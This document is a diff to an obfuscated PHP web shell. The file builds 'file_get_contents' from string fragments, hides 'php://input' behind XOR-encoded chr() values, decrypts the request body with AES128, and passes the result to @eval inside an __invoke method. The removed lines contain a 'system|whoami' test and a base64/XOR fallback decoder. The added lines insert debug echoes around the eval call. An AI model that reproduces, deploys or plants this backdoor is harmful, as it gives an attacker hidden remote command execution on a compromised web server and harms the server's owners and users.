@@ -25,39 +25,15 @@ $f='file'.'_get'.'_contents';
 $p='|||||||||||'^chr(12).chr(20).chr(12).chr(70).chr(83).chr(83).chr(21).chr(18).chr(12).chr(9).chr(8);
 
 //file_get_content(php://input)
-$HA1VG=$f($p);
-
-//test debug
-$plaintext="system|whoami"
-
-$ciphertext = openssl_encrypt($plaintext, "AES128", $key);
-echo $ciphertext;
-
-$HA1VG=$ciphertext;
-//if openssl isn't loaded
-if(!extension_loaded('openssl')){
-	$t=preg_filter('/\s+/','','base 64 _ deco de');
-	$HA1VG=$t($HA1VG."");
-
-	for($i=0;$i<strlen($HA1VG);$i++) {
-		$new_key = $key[$i+1&15];
-		$HA1VG[$i] = $HA1VG[$i] ^ $new_key;
-	}
-}
-
-else{
-	$HA1VG=openssl_decrypt($HA1VG, "AES128", $key);
-}
-
-echo "\n", ($HA1VG);
-
-$arr=explode('|',$HA1VG);
-$func=$arr[0];
-$params=$arr[1];
+$payload_c=$f($p);
+$payload="system('echo "hello there"');";
+$payload=openssl_decrypt($payload_c, "AES128", $key);
 
 class GFvTKW88{
 	public function __invoke($p) {
+		echo " <br>before eval()";
 		@eval("\n".$p."\n");
+		echo "<br> after eval()";
 	}
 }
 
